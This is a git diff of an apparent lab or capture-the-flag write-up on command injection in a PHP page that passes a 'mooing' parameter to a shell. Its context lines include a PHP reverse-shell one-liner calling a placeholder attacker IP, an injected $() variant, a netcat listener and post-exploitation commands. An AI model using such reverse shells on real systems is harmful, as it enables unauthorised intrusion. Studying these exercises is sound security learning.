@@ -11,7 +11,8 @@ Successful exploitation allows attackers to enumerate files, identify users, and
 Proper input validation, parameter sanitization, and avoiding direct command execution with user input are critical to prevent command injection.
 
 The scenario encourages exploiting the vulnerability to answer several security questions related to system configuration, user accounts, and installed software.
-example of the code is 
+example of the code is
+
 ```bash
 <?php
     if (isset($_GET["mooing"])) {
@@ -36,7 +37,7 @@ ps -ef
 ```
 EXPLOITATION TIME:
 
-First is to create a reverse shell on the terminal for command execution in that case I shall use a cheat sheet i.e [swissky-repo](swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#ruby)
+First is to create a reverse shell on the terminal for command execution in that case I shall use a cheat sheet i.e [cheat-sheet](swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#ruby)
 
 where we paste this ```$(php -r '$sock=fsockopen("attacker_ip",port_NO);exec("/bin/sh -i <&3 >&3 2>&3");')``` ,also this command may work ```php -r '$sock=fsockopen("attacker_ip",port_NO);exec("/bin/sh -i <&3 >&3 2>&3");'```
 
@@ -45,7 +46,6 @@ on the command prompt on the web while we listen using nc port listener in order
 After having an interactive shell we can then run several commands that is:
 
 ```bash
-
 whoami  # shows the user
 
 ls  #shows the available files and directories on that user
